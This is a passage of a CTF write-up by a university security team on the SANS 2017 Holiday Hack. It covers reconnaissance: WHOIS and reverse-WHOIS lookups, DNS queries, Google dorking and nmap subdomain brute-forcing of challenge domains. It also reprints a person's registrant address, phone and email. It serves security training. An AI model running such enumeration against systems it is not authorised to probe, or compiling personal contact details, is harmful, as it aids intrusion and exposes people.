<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>SANS 2017 Holiday Hack Writeup</title>
<meta name="generator" content="Org mode" />
<meta name="author" content="NCSA Security Team" />
<style type="text/css">
 <!--/*--><![CDATA[/*><!--*/
  .title  { text-align: center;
             margin-bottom: .2em; }
  .subtitle { text-align: center;
              font-size: medium;
              font-weight: bold;
              margin-top:0; }
  .todo   { font-family: monospace; color: red; }
  .done   { font-family: monospace; color: green; }
  .priority { font-family: monospace; color: orange; }
  .tag    { background-color: #eee; font-family: monospace;
            padding: 2px; font-size: 80%; font-weight: normal; }
  .timestamp { color: #bebebe; }
  .timestamp-kwd { color: #5f9ea0; }
  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
  .underline { text-decoration: underline; }
  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
  p.verse { margin-left: 3%; }
  pre {
    border: 1px solid #ccc;
    box-shadow: 3px 3px 3px #eee;
    padding: 8pt;
    font-family: monospace;
    overflow: auto;
    margin: 1.2em;
  }
  pre.src {
    position: relative;
    overflow: visible;
    padding-top: 1.2em;
  }
  pre.src:before {
    display: none;
    position: absolute;
    background-color: white;
    top: -10px;
    right: 10px;
    padding: 3px;
    border: 1px solid black;
  }
  pre.src:hover:before { display: inline;}
  /* Languages per Org manual */
  pre.src-asymptote:before { content: 'Asymptote'; }
  pre.src-awk:before { content: 'Awk'; }
  pre.src-C:before { content: 'C'; }
  /* pre.src-C++ doesn't work in CSS */
  pre.src-clojure:before { content: 'Clojure'; }
  pre.src-css:before { content: 'CSS'; }
  pre.src-D:before { content: 'D'; }
  pre.src-ditaa:before { content: 'ditaa'; }
  pre.src-dot:before { content: 'Graphviz'; }
  pre.src-calc:before { content: 'Emacs Calc'; }
  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
  pre.src-fortran:before { content: 'Fortran'; }
  pre.src-gnuplot:before { content: 'gnuplot'; }
  pre.src-haskell:before { content: 'Haskell'; }
  pre.src-hledger:before { content: 'hledger'; }
  pre.src-java:before { content: 'Java'; }
  pre.src-js:before { content: 'Javascript'; }
  pre.src-latex:before { content: 'LaTeX'; }
  pre.src-ledger:before { content: 'Ledger'; }
  pre.src-lisp:before { content: 'Lisp'; }
  pre.src-lilypond:before { content: 'Lilypond'; }
  pre.src-lua:before { content: 'Lua'; }
  pre.src-matlab:before { content: 'MATLAB'; }
  pre.src-mscgen:before { content: 'Mscgen'; }
  pre.src-ocaml:before { content: 'Objective Caml'; }
  pre.src-octave:before { content: 'Octave'; }
  pre.src-org:before { content: 'Org mode'; }
  pre.src-oz:before { content: 'OZ'; }
  pre.src-plantuml:before { content: 'Plantuml'; }
  pre.src-processing:before { content: 'Processing.js'; }
  pre.src-python:before { content: 'Python'; }
  pre.src-R:before { content: 'R'; }
  pre.src-ruby:before { content: 'Ruby'; }
  pre.src-sass:before { content: 'Sass'; }
  pre.src-scheme:before { content: 'Scheme'; }
  pre.src-screen:before { content: 'Gnu Screen'; }
  pre.src-sed:before { content: 'Sed'; }
  pre.src-sh:before { content: 'shell'; }
  pre.src-sql:before { content: 'SQL'; }
  pre.src-sqlite:before { content: 'SQLite'; }
  /* additional languages in org.el's org-babel-load-languages alist */
  pre.src-forth:before { content: 'Forth'; }
  pre.src-io:before { content: 'IO'; }
  pre.src-J:before { content: 'J'; }
  pre.src-makefile:before { content: 'Makefile'; }
  pre.src-maxima:before { content: 'Maxima'; }
  pre.src-perl:before { content: 'Perl'; }
  pre.src-picolisp:before { content: 'Pico Lisp'; }
  pre.src-scala:before { content: 'Scala'; }
  pre.src-shell:before { content: 'Shell Script'; }
  pre.src-ebnf2ps:before { content: 'ebfn2ps'; }
  /* additional language identifiers per "defun org-babel-execute"
       in ob-*.el */
  pre.src-cpp:before  { content: 'C++'; }
  pre.src-abc:before  { content: 'ABC'; }
  pre.src-coq:before  { content: 'Coq'; }
  pre.src-groovy:before  { content: 'Groovy'; }
  /* additional language identifiers from org-babel-shell-names in
     ob-shell.el: ob-shell is the only babel language using a lambda to put
     the execution function name together. */
  pre.src-bash:before  { content: 'bash'; }
  pre.src-csh:before  { content: 'csh'; }
  pre.src-ash:before  { content: 'ash'; }
  pre.src-dash:before  { content: 'dash'; }
  pre.src-ksh:before  { content: 'ksh'; }
  pre.src-mksh:before  { content: 'mksh'; }
  pre.src-posh:before  { content: 'posh'; }
  /* Additional Emacs modes also supported by the LaTeX listings package */
  pre.src-ada:before { content: 'Ada'; }
  pre.src-asm:before { content: 'Assembler'; }
  pre.src-caml:before { content: 'Caml'; }
  pre.src-delphi:before { content: 'Delphi'; }
  pre.src-html:before { content: 'HTML'; }
  pre.src-idl:before { content: 'IDL'; }
  pre.src-mercury:before { content: 'Mercury'; }
  pre.src-metapost:before { content: 'MetaPost'; }
  pre.src-modula-2:before { content: 'Modula-2'; }
  pre.src-pascal:before { content: 'Pascal'; }
  pre.src-ps:before { content: 'PostScript'; }
  pre.src-prolog:before { content: 'Prolog'; }
  pre.src-simula:before { content: 'Simula'; }
  pre.src-tcl:before { content: 'tcl'; }
  pre.src-tex:before { content: 'TeX'; }
  pre.src-plain-tex:before { content: 'Plain TeX'; }
  pre.src-verilog:before { content: 'Verilog'; }
  pre.src-vhdl:before { content: 'VHDL'; }
  pre.src-xml:before { content: 'XML'; }
  pre.src-nxml:before { content: 'XML'; }
  /* add a generic configuration mode; LaTeX export needs an additional
     (add-to-list 'org-latex-listings-langs '(conf " ")) in .emacs */
  pre.src-conf:before { content: 'Configuration File'; }

  table { border-collapse:collapse; }
  caption.t-above { caption-side: top; }
  caption.t-bottom { caption-side: bottom; }
  td, th { vertical-align:top;  }
  th.org-right  { text-align: center;  }
  th.org-left   { text-align: center;   }
  th.org-center { text-align: center; }
  td.org-right  { text-align: right;  }
  td.org-left   { text-align: left;   }
  td.org-center { text-align: center; }
  dt { font-weight: bold; }
  .footpara { display: inline; }
  .footdef  { margin-bottom: 1em; }
  .figure { padding: 1em; }
  .figure p { text-align: center; }
  .inlinetask {
    padding: 10px;
    border: 2px solid gray;
    margin: 10px;
    background: #ffffcc;
  }
  #org-div-home-and-up
   { text-align: right; font-size: 70%; white-space: nowrap; }
  textarea { overflow-x: auto; }
  .linenr { font-size: smaller }
  .code-highlighted { background-color: #ffff00; }
  .org-info-js_info-navigation { border-style: none; }
  #org-info-js_console-label
    { font-size: 10px; font-weight: bold; white-space: nowrap; }
  .org-info-js_search-highlight
    { background-color: #ffff00; color: #000000; font-weight: bold; }
  .org-svg { width: 90%; }
  /*]]>*/-->
</style>
<link rel="stylesheet" type="text/css" href="css/htmlize.css"/>
<link rel="stylesheet" type="text/css" href="http://www.pirilampo.org/styles/readtheorg/css/htmlize.css"/>
<link rel="stylesheet" type="text/css" href="http://www.pirilampo.org/styles/readtheorg/css/readtheorg.css"/>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js"></script>
<script type="text/javascript" src="js/jquery.stickytableheaders.min.js"></script>
<script type="text/javascript" src="http://www.pirilampo.org/styles/readtheorg/js/readtheorg.js"></script>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
<style>#content{max-width:1200px;}</style>
<script type="text/javascript">
/*
@licstart  The following is the entire license notice for the
JavaScript code in this tag.

Copyright (C) 2012-2017 Free Software Foundation, Inc.

The JavaScript code in this tag is free software: you can
redistribute it and/or modify it under the terms of the GNU
General Public License (GNU GPL) as published by the Free Software
Foundation, either version 3 of the License, or (at your option)
any later version.  The code is distributed WITHOUT ANY WARRANTY;
without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.

As additional permission under GNU GPL version 3 section 7, you
may distribute non-source (e.g., minimized or compacted) forms of
that code without the copy of the GNU GPL normally required by
section 4, provided you include this license notice and a URL
through which recipients can access the Corresponding Source.


@licend  The above is the entire license notice
for the JavaScript code in this tag.
*/
<!--/*--><![CDATA[/*><!--*/
 function CodeHighlightOn(elem, id)
 {
   var target = document.getElementById(id);
   if(null != target) {
     elem.cacheClassElem = elem.className;
     elem.cacheClassTarget = target.className;
     target.className = "code-highlighted";
     elem.className   = "code-highlighted";
   }
 }
 function CodeHighlightOff(elem, id)
 {
   var target = document.getElementById(id);
   if(elem.cacheClassElem)
     elem.className = elem.cacheClassElem;
   if(elem.cacheClassTarget)
     target.className = elem.cacheClassTarget;
 }
/*]]>*///-->
</script>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        displayAlign: "center",
        displayIndent: "0em",

        "HTML-CSS": { scale: 100,
                        linebreaks: { automatic: "false" },
                        webFont: "TeX"
                       },
        SVG: {scale: 100,
              linebreaks: { automatic: "false" },
              font: "TeX"},
        NativeMML: {scale: 100},
        TeX: { equationNumbers: {autoNumber: "AMS"},
               MultLineWidth: "85%",
               TagSide: "right",
               TagIndent: ".8em"
             }
});
</script>
<script type="text/javascript"
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS_HTML"></script>
</head>
<body>
<div id="content">
<h1 class="title">SANS 2017 Holiday Hack Writeup</h1>
<div id="table-of-contents">
<h2>Table of Contents</h2>
<div id="text-table-of-contents">
<ul>
<li><a href="#orgd334ad8">Introduction</a></li>
<li><a href="#orgbf24d1b">tl;dr: Quick Answers</a></li>
<li><a href="#org4b4381f">Pre-contest Reconnaissance</a>
<ul>
<li><a href="#org627681f">Whois Searching</a></li>
<li><a href="#orgc650d33">DNS Brute Forcing</a></li>
<li><a href="#orga2e658d">Certificate Transparency Logs</a></li>
<li><a href="#org99da2a9">Monitoring</a></li>
<li><a href="#orgfd425cb">And Then Things Changed&#x2026;</a></li>
<li><a href="#orgf1236ba">Recon Summary</a></li>
</ul>
</li>
<li><a href="#orgc7da064">Terminals</a>
<ul>
<li><a href="#org0ae9163">Winter Wonder Landing</a>
<ul>
<li><a href="#landing_question">Question</a></li>
<li><a href="#landing_how-to-find-the-terminal">How to find the terminal</a></li>
<li><a href="#landing_background-information">Background Information</a></li>
<li><a href="#landing_goal">Goal</a></li>
<li><a href="#landing_hints">Hints</a></li>
<li><a href="#landing_approach">Approach</a></li>
<li><a href="#landing_solution">Solution</a></li>
<li><a href="#landing_alternatives">Alternatives</a></li>
</ul>
</li>
<li><a href="#org775a0cb">Winconceivable The Cliffs Of Insanity</a>
<ul>
<li><a href="#cliffs_question">Question</a></li>
<li><a href="#cliffs_how-to-find-the-terminal">How to find the terminal</a></li>
<li><a href="#cliffs_background-information">Background Information</a></li>
<li><a href="#cliffs_goal">Goal</a></li>
<li><a href="#cliffs_hints">Hints</a></li>
<li><a href="#cliffs_approach">Approach</a></li>
<li><a href="#cliffs_solution">Solution</a></li>
<li><a href="#cliffs_alternatives">Alternatives</a></li>
<li><a href="#cliffs_common-pitfalls">Common Pitfalls</a></li>
</ul>
</li>
<li><a href="#org9a23438">Cryokinetic Magic</a>
<ul>
<li><a href="#cryokinetic_question">Question</a></li>
<li><a href="#cryokinetic_how-to-find-the-terminal">How to find the terminal</a></li>
<li><a href="#cryokinetic_background-information">Background Information</a></li>
<li><a href="#cryokinetic_goal">Goal</a></li>
<li><a href="#cryokinetic_hints">Hints</a></li>
<li><a href="#cryokinetic_approach">Approach</a></li>
<li><a href="#cryokinetic_solution">Solution</a></li>
<li><a href="#cryokinetic_alternatives">Alternatives</a></li>
</ul>
</li>
<li><a href="#org5fcf992">There's Snow Place Like Home</a>
<ul>
<li><a href="#home_question">Question</a></li>
<li><a href="#home_how-to-find-the-terminal">How to find the terminal</a></li>
<li><a href="#home_background-information">Background Information</a></li>
<li><a href="#home_goal">Goal</a></li>
<li><a href="#home_hints">Hints</a></li>
<li><a href="#home_approach">Approach</a></li>
<li><a href="#home_solution">Solution</a></li>
<li><a href="#home_alternatives">Alternatives</a></li>
<li><a href="#home_common-pitfalls">Common Pitfalls</a></li>
</ul>
</li>
<li><a href="#org959931a">Bumble's Bounce</a>
<ul>
<li><a href="#bounce_question">Question</a></li>
<li><a href="#bounce_how-to-find-the-terminal">How to find the terminal</a></li>
<li><a href="#bounce_background-information">Background Information</a></li>
<li><a href="#bounce_goal">Goal</a></li>
<li><a href="#bounce_hints">Hints</a></li>
<li><a href="#bounce_approach">Approach</a></li>
<li><a href="#bounce_solution">Solution</a></li>
<li><a href="#bounce_alternatives">Alternatives</a></li>
<li><a href="#bounce_common-pitfalls">Common Pitfalls</a></li>
</ul>
</li>
<li><a href="#orgacb3305">I Don't Think We're In Kansas Anymore</a>
<ul>
<li><a href="#kansas_question">Question</a></li>
<li><a href="#kansas_how-to-find-the-terminal">How to find the terminal</a></li>
<li><a href="#kansas_background-information">Background Information</a></li>
<li><a href="#kansas_goal">Goal</a></li>
<li><a href="#kansas_hints">Hints</a></li>
<li><a href="#kansas_approach">Approach</a></li>
<li><a href="#kansas_solution">Solution</a></li>
<li><a href="#kansas_alternatives">Alternatives</a></li>
</ul>
</li>
<li><a href="#org78dc254">Oh Wait Maybe We Are</a>
<ul>
<li><a href="#we_are_question">Question</a></li>
<li><a href="#we_are_how-to-find-the-terminal">How to find the terminal</a></li>
<li><a href="#we_are_background-information">Background Information</a></li>
<li><a href="#we_are_goal">Goal</a></li>
<li><a href="#we_are_approach">Hints</a></li>
<li><a href="#we_are_approach">Approach</a></li>
<li><a href="#we_are_solution">Solution</a></li>
<li><a href="#we_are_alternatives">Alternatives</a></li>
<li><a href="#we_are_common-pitfalls">Common Pitfalls</a></li>
<li><a href="#org6632580">Going Further - Privilege Escalation</a></li>
</ul>
</li>
<li><a href="#org7ed1cdd">We're Off To See The</a>
<ul>
<li><a href="#off_question">Question</a></li>
<li><a href="#off_how-to-find-the-terminal">How to find the terminal</a></li>
<li><a href="#off_background-information">Background Information</a></li>
<li><a href="#off_goal">Goal</a></li>
<li><a href="#off_hints">Hints</a></li>
<li><a href="#off_approach">Approach</a></li>
<li><a href="#off_solution">Solution</a></li>
<li><a href="#off_alternatives">Alternatives</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#orgb27f4c4"><span class="todo TODO">TODO</span> Answers</a>
<ul>
<li><a href="#org8c00b1f">Game: This Page Fell off a Truck</a>
<ul>
<li><a href="#q1_question">Question</a></li>
<li><a href="#q2_solution">Solution</a></li>
</ul>
</li>
<li><a href="#org274b925">L2S: Letters to Santa</a>
<ul>
<li><a href="#q2_question">Question</a></li>
<li><a href="#q2_background-information">Background Information</a></li>
<li><a href="#q2_goal">Goal</a></li>
<li><a href="#q2_approach">Approach</a></li>
<li><a href="#q2_solution">Solution</a></li>
<li><a href="#q2_alternatives">Alternatives</a></li>
<li><a href="#q2_common-pitfalls">Common Pitfalls</a></li>
<li><a href="#q2_about-the-challenge">About the Challenge</a></li>
<li><a href="#org3d17a46">Moving Foward</a></li>
</ul>
</li>
<li><a href="#org5b76bc9">SMB: Windows Fileshare</a>
<ul>
<li><a href="#q3_question">Question</a></li>
<li><a href="#q3_background-information">Background Information</a></li>
<li><a href="#q3_goal">Goal</a></li>
<li><a href="#q3_approach">Approach</a></li>
<li><a href="#q3_solution">Solution</a></li>
<li><a href="#q3_common-pitfalls">Common Pitfalls</a></li>
</ul>
</li>
<li><a href="#org1b14128">EWA: Elf Web Access</a>
<ul>
<li><a href="#q4_question">Question</a></li>
<li><a href="#q4_background-information">Background Information</a></li>
<li><a href="#q4_goal">Goal</a></li>
<li><a href="#q4_approach">Approach</a></li>
<li><a href="#q4_solution">Solution</a></li>
<li><a href="#q4_alternatives">Alternatives</a></li>
<li><a href="#q4_common-pitfalls">Common Pitfalls</a></li>
</ul>
</li>
<li><a href="#org5bcc11b">NPPD: Naughty Moles</a>
<ul>
<li><a href="#q5_question">Question</a></li>
<li><a href="#q5_background-information">Background Information</a></li>
<li><a href="#q5_goal">Goal</a></li>
<li><a href="#q5_approach">Approach</a></li>
<li><a href="#q5_solution">Solution</a></li>
</ul>
</li>
<li><a href="#org28d0ade">EaaS: TODO Question 6</a>
<ul>
<li><a href="#q6_question">Question</a></li>
<li><a href="#q6_background-information">Background Information</a></li>
<li><a href="#q6_goal">Goal</a></li>
<li><a href="#q6_approach">Approach</a></li>
<li><a href="#q6_solution">Solution</a></li>
<li><a href="#q6_alternatives">Alternatives</a></li>
<li><a href="#q6_common-pitfalls">Common Pitfalls</a></li>
<li><a href="#q6_about-the-challenge">About the Challenge</a></li>
</ul>
</li>
<li><a href="#org9ff07f0">EMI: Going Deep</a>
<ul>
<li><a href="#q7_question">Question</a></li>
<li><a href="#q7_background-information">Background Information</a></li>
<li><a href="#q7_goal">Goal</a></li>
<li><a href="#q7_approach">Approach</a></li>
<li><a href="#q7_solution">Solution</a></li>
<li><a href="#org712c4e5">Going Deeper &#x2013; Command Execution</a></li>
<li><a href="#org652b78f">Level 2 &#x2013; Meterpreter Shell</a></li>
<li><a href="#org3e8bd2d">Getting Alabaster's Password</a></li>
<li><a href="#orgbe5b2b9">Next up &#x2013; Privilege Escalation!</a></li>
</ul>
</li>
<li><a href="#org3991694"><span class="todo TODO">TODO</span> EDB: Question 8</a>
<ul>
<li><a href="#q8_question">Question</a></li>
<li><a href="#q8_background-information">Background Information</a></li>
<li><a href="#q8_goal">Goal</a></li>
<li><a href="#q8_approach">Approach</a></li>
<li><a href="#q8_solution">Solution</a></li>
<li><a href="#q8_alternatives">Alternatives</a></li>
<li><a href="#q8_common-pitfalls">Common Pitfalls</a></li>
<li><a href="#q8_about-the-challenge">About the Challenge</a></li>
</ul>
</li>
<li><a href="#orgd5a4dae">Fin: The Evil Good Witch</a>
<ul>
<li><a href="#q9_question">Question</a></li>
<li><a href="#q9_solution">Solution</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#orge4e5f3f">Easter Eggs</a>
<ul>
<li><a href="#org5ade6b7">Story Page</a>
<ul>
<li><a href="#orgeeac070">Wintered logo is based on the Wicked stage musical poster.</a></li>
<li><a href="#org9079d81">Short video is based on video intro to Rudolph the Red-Nosed Reindeer</a></li>
</ul>
</li>
<li><a href="#org8480a98">North Pole and Beyond</a>
<ul>
<li><a href="#org762c254">Stocking</a></li>
<li><a href="#org693a1e9">Exploration</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</div>
</div>

<div id="outline-container-orgd334ad8" class="outline-2">
<h2 id="orgd334ad8">Introduction</h2>
<div class="outline-text-2" id="text-orgd334ad8">
<p>
We are the Security team at the National Center for Supercomputing
Applications, and we worked together on yet another fun SANS Holiday
Hack, like we did last year. Over the past year, we've been surprised
to see how many skills and tricks from the 2016 Holiday Hack we used
for our jobs.
</p>

<p>
We've done "red-team" work such as code reviews and pen-tests, where
we encountered insufficient PHP input sanitization, development files
being left in production, and services being unintentionally
exposed. Our role in these instances is to find these issues before
someone malicious does, and to help and educate our users to
understand and prevent this from reoccuring. Other work we do is in
architecting defenses and mitigations. How do we secure systems and
services, while being as transparent as possible to end-users?
</p>

<p>
As we do red-team work, it's useful to try to think like a defender:
"How would <b>I</b> have secured this system, and are there any ways around
that?" Similarly, as we do blue-team work, we need to know the methods
and tools that an attacker would use.
</p>

<p>
Our approach for this year's Holiday Hack was to stick as closely as
possible to the hints, blog posts, and tools provided. &#x2026;and then to
try to elevate privileges, crack passwords, and see what other
information we could find, all while taking care to stay within the
scope of the challenge. We also tried to automate as much of our work
as possible, and we make these tools publicly available.
</p>
</div>
</div>
<div id="outline-container-orgbf24d1b" class="outline-2">
<h2 id="orgbf24d1b">tl;dr: Quick Answers</h2>
<div class="outline-text-2" id="text-orgbf24d1b">
<ol class="org-ol">
<li>What is the title of the first page? <b>About This Book&#x2026;</b></li>
<li>What is the topic of The Great Book page available in the web root of the server? <b>On the Topic of Flying Animals</b><br />
What is Alabaster Snowball's password? <b>stream_unhappy_buy_loss</b></li>
<li>What is the file server share name? <b>FileStor</b></li>
<li>What can you learn from The Great Book page found in an e-mail on EWA? <b>The behavior of the Abominable Snowman ("Bumble") has recently become erratic. Rumor has it that there must've been some magic in something he ate.</b></li>
<li>TODO</li>
<li>What is the title of The Great Book page on EAAS? <b>The Dreaded Inter-Dimensional Tornadoes</b></li>
<li>What does The Great Book page on EMI describe? <b>The Witches of Oz</b></li>
<li>Who wrote the letter to Santa on edb? <b>The Wizard of Oz</b></li>
<li>Which character is the villain, and what is the motive? <b>Glinda, the Good Witch. To stir up elf-munchkin hostilities and sell her magic to both sides.</b></li>
</ol>
</div>
</div>
<div id="outline-container-org4b4381f" class="outline-2">
<h2 id="org4b4381f">Pre-contest Reconnaissance</h2>
<div class="outline-text-2" id="text-org4b4381f">

<div class="figure">
<p><img src="./images/sans_holiday_hack_preview.png" alt="sans_holiday_hack_preview.png" />
</p>
<p><span class="figure-number">Figure 1: </span>SANS Holiday Hack Challenge December 5th Update</p>
</div>

<p>
On December 5th, the SANS Holiday Hack Challenge was updated to tell
us that the 2017 Hack was coming soon, and encouraging us to catch up
on past challenges. The next day, we started doing just that. In
addition to reviewing previous challenges, we also began some
reconnaissance for the 2017 challenge.
</p>

<p>
Recon is a crucial step of any good penetration test, and is one that
often gets skipped in a "Capture the Flag" type of competition, since
most of the information is provided. Nevertheless, let's see what we
can find. The more information we have ahead of time, the better
prepared we'll be, and the less work we'll have to do during the
actual contest.
</p>

<p>
Much like how attackers will have indicators of compromise (IOCs)
which allow us to track and follow an individual attacker, the Counter
Hack team also does similar things every year, and will leave behind
some clues.
</p>
</div>

<div id="outline-container-org627681f" class="outline-3">
<h3 id="org627681f">Whois Searching</h3>
<div class="outline-text-3" id="text-org627681f">
<p>
For example, the 2016 contest made use of the domain
www.northpolewonderland.com. We can look at publicly available WHOIS
data for that domain:
</p>

<div class="org-src-container">
<pre class="src src-sh">whois northpolewonderland.com | grep Registrant
</pre>
</div>

<pre class="example">
Registrant Name: Edward Skoudis
Registrant Organization: Counter Hack
Registrant Street: 2402 Alexandra Court
Registrant City: Howell
Registrant State/Province: New Jersey
Registrant Postal Code: 07731
Registrant Country: US
Registrant Phone: +1.7327511024
Registrant Phone Ext:
Registrant Fax: +1.7327511024
Registrant Fax Ext:
Registrant Email: edskoudis@yahoo.com
</pre>

<p>
There are a few services that allow you to do a "reverse WHOIS"
search, to search for domains by WHOIS data. For instance to search
for other domains where "edskoudis@yahoo.com" shows up in the contact
info: 
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-right" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Domain Name</th>
<th scope="col" class="org-right">Creation Date</th>
<th scope="col" class="org-left">Registrar</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">northpolechristmastown.com</td>
<td class="org-right">2017-10-19</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">1hrctf.com</td>
<td class="org-right">2016-04-08</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">1hrctf.org</td>
<td class="org-right">2016-04-08</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">cranbian.org</td>
<td class="org-right">2016-11-22</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">hackfestchallenge.com</td>
<td class="org-right">2016-10-20</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">onehourctf.org</td>
<td class="org-right">2016-04-08</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">atnascorp.com</td>
<td class="org-right">2015-11-10</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">ginormouselectronicssupplier.com</td>
<td class="org-right">2015-12-09</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">holidayhackchallenge.com</td>
<td class="org-right">2015-11-02</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">holidayhackchallenge.org</td>
<td class="org-right">2015-11-02</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">digimeme.org</td>
<td class="org-right">2013-11-18</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">syn-pi.org</td>
<td class="org-right">2013-11-18</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">pseudovision.net</td>
<td class="org-right">2010-09-09</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>

<tr>
<td class="org-left">counterhack.net</td>
<td class="org-right">2001-06-22</td>
<td class="org-left">NETWORK SOLUTIONS, LLC.</td>
</tr>

<tr>
<td class="org-left">skoudis.com</td>
<td class="org-right">2001-06-22</td>
<td class="org-left">NETWORK SOLUTIONS, LLC.</td>
</tr>

<tr>
<td class="org-left">counterhack.com</td>
<td class="org-right">2000-05-30</td>
<td class="org-left">GODADDY.COM, LLC</td>
</tr>
</tbody>
</table>

<p>
This isn't comprehensive, since northpolewonderland.com didn't show up
in the results, but cranbian.org was another domain from 2016 that
does show up.
</p>

<p>
There are a couple of new entries since the 2016 contest, 1hrctf and
northpolechristmastown.com. 1hrctf seems unrelated, but it's a good
bet that northpolechristmastown.com will show up in the 2017
challenge.
</p>

<p>
At this point, we have to proceed with extreme caution. Since the
contest hasn't started, nothing is in scope yet. Any further digging
should be as unintrusive as possible.
</p>
</div>
</div>

<div id="outline-container-orgc650d33" class="outline-3">
<h3 id="orgc650d33">DNS Brute Forcing</h3>
<div class="outline-text-3" id="text-orgc650d33">
<p>
Now that we have a domain we're interested in, let's look at DNS:
</p>

<div class="org-src-container">
<pre class="src src-sh">dig ANY northpolechristmastown.com
</pre>
</div>

<pre class="example">
;; ANSWER SECTION:
northpolechristmastown.com. 5	IN	TXT	"v=spf1 include:_spf.google.com -all"
northpolechristmastown.com. 5	IN	MX	30 ALT2.ASPMX.L.GOOGLE.com.
northpolechristmastown.com. 5	IN	MX	40 ASPMX2.GOOGLEMAIL.com.
northpolechristmastown.com. 5	IN	MX	20 ALT1.ASPMX.L.GOOGLE.com.
northpolechristmastown.com. 5	IN	MX	50 ASPMX3.GOOGLEMAIL.com.
northpolechristmastown.com. 5	IN	MX	10 ASPMX.L.GOOGLE.com.
northpolechristmastown.com. 5	IN	SOA	ns53.domaincontrol.com. dns.jomax.net. 2017120112 28800 7200 604800 600
northpolechristmastown.com. 5	IN	NS	ns54.domaincontrol.com.
northpolechristmastown.com. 5	IN	NS	ns53.domaincontrol.com.
</pre>

<p>
From this, we can tell that GMail provides the e-mail for the domain,
and GoDaddy provides the DNS service. Of note, however, is that there
are no A or AAAA records, so northpolechristmastown.com does not
resolve to anything.
</p>

<p>
Next, we'll try some Google dorking. Googling for
site:northpolechristmastown.com reveals
nppd.northpolechristmastown.com, which is a Sign In page for the
North Pole Police Department. It looks like nppd uses Google OAuth
for authentication, and most pages are forbidden with a regular GMail
account.
</p>

<p>
Checking a few other common URLs on nppd, we can find some resources
that are available, including favicon.ico and robots.txt:
</p>
<pre class="example">
User-agent: hk-47
Disallow: /
Disallow: /needhelp
Disallow: /infractions
Disallow: /community
Disallow: /about

User-agent: threepio
Sand-Crawler-delay: 421

User-agent: artoo
Sand-Crawler-delay: 2187
</pre>


<div class="figure">
<p><img src="./images/nppd_star.png" alt="nppd_star.png" />
</p>
<p><span class="figure-number">Figure 2: </span>North Pole Police Department Logo</p>
</div>

<p>
Everything here but /infractions is forbidden. Looking at that page
returns a list of infractions, such as "Unauthorized access to cookie
jar" or "Computer infraction: Accessing siblings files without
permission." We also see some interesting infractions that refer to
previous Holiday Hacks:
</p>

<pre class="example">
    {
        "date": "2016-12-25T00:00:00",
        "name": "Dr. Who",
        "severity": 5.0,
        "status": "closed",
        "title": "Trying to ruin Christmas"
    },
    {
        "date": "2015-12-25T00:00:00",
        "name": "Cindy Lou Who",
        "severity": 5.0,
        "status": "closed",
        "title": "Trying to ruin Christmas"
    }
],
"query": "name:Who"
</pre>

<p>
Going back to DNS, we can try to enumerate some hosts under the top
level domain. FuzzDB has a nice list of common DNS name, and we can
use an nmap script to try to query those:
</p>

<div class="org-src-container">
<pre class="src src-sh">$ nmap --script dns-brute --script-args dns-brute.domain=northpolechristmastown.com,dns-brute.threads=1,dns-brute.hostlist=fuzzdb/discovery/dns/dnsmapCommonSubdomains.txt
</pre>
</div>

<pre class="example">
Starting Nmap 7.60 ( https://nmap.org ) at 2017-12-06 18:54 CST
Stats: 0:00:06 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Pre-scan script results:
| dns-brute:
|   DNS Brute-force hostnames:
|     intranet.northpolechristmastown.com - 35.196.239.128
|     files.northpolechristmastown.com - 35.185.43.23
|     dev.northpolechristmastown.com - 35.185.84.51
|     admin.northpolechristmastown.com - 35.185.115.185
|_    mail.northpolechristmastown.com - 35.185.115.185
</pre>

<p>
A couple of other lists resulted in the following hostnames as well:
</p>

<pre class="example">
|   DNS Brute-force hostnames:
|     emi.northpolechristmastown.com - 35.185.57.190
|_    ewa.northpolechristmastown.com - 35.185.115.185
</pre>
</div>
</div>

<div id="outline-container-orga2e658d" class="outline-3">
